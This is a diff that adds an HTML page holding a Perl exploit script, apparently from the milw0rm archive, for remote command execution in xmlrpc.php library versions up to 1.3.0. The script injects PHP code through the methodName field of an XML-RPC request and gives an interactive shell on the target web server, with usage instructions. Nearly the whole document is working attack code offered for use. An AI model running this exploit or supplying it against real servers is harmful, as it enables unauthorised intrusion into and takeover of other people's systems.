@@ -1,0 +1,67 @@
+<html>
+<head>
+<title>xmlrpc.php Library <= 1.3.0 Remote Command Execute Exploit (2)</title>
+<pre>
+#-------------------------------------------------------#
+#                     /|                                #       
+#                    | |                                #      
+#                    | |                                #      
+#       /\   ________| |___                             #       
+#      /  \  \_______   __/                             #
+#     /    \|\_____  | | _       _  _     _  ()___      #      
+#    /  /\  \  ___ \ | |&lt;_&gt;  /  |  |  | || \ || | | |   #       
+#   /  /__\  \|   \ || | _  /__ |_ |  | ||_/ || | |_|   #       
+#  /  ______  \   | || || |   / |  |  | || \ || |   |   #       
+# /  /      \  \  | || || |  /  |_ |_ |_||  \|| | \_|   #       
+# \_/       |\_/  | || || | ___ _  _                    #       
+#           | |   | || /| |  | |  | ||\/|               #       
+#            \|    \||/  \|  | |_ |_||  |               #       
+#                            | |  | ||  |               #       
+#                            | |_ | ||  |               #       
+#                                                       #
+#         Original advisory by http://gulftech.org/     #
+#         Exploit coded by dukenn (http://asteam.org)   #
+#                                                       # 
+#-------------------------------------------------------
+
+#!/usr/bin/perl
+
+use IO::Socket;
+
+print &quot;XMLRPC remote commands execute exploit by dukenn (http://asteam.org)\n&quot;;
+
+if ($ARGV[0] &amp;&amp; $ARGV[1])
+{
+ $host = $ARGV[0];
+ $xml = $ARGV[1];
+ $sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;connecterror\n&quot;;
+ while (1) {
+    print '['.$host.']# ';
+    $cmd = &lt;STDIN&gt;;
+    chop($cmd);
+    last if ($cmd eq 'exit');
+    $xmldata = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;test.method&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;name&gt;',''));echo '_begin_\n';echo `&quot;.$cmd.&quot;`;echo '_end_';exit;/*&lt;/name&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;;
+    print $sock &quot;POST &quot;.$xml.&quot; HTTP/1.1\n&quot;;
+    print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
+    print $sock &quot;Content-Type: text/xml\n&quot;;
+    print $sock &quot;Content-Length:&quot;.length($xmldata).&quot;\n\n&quot;.$xmldata;
+    $good=0;
+    while ($ans = &lt;$sock&gt;)
+       {
+        if ($good == 1) { print &quot;$ans&quot;; }
+        last if ($ans =~ /^_end_/);
+        if ($ans =~ /^_begin_/) { $good = 1; }
+       }
+      if ($good==0) {print &quot;Exploit Failed\n&quot;;exit();}
+   }
+ }
+else {
+ print &quot;Usage: perl xml.pl [host] [path_to_xmlrpc]\n\n&quot;;
+ print &quot;Example: perl xml.pl target.com /script/xmlrpc.php\n&quot;;
+exit;
+}
+
+# milw0rm.com [2005-07-04]
+</pre>
+</html>
+
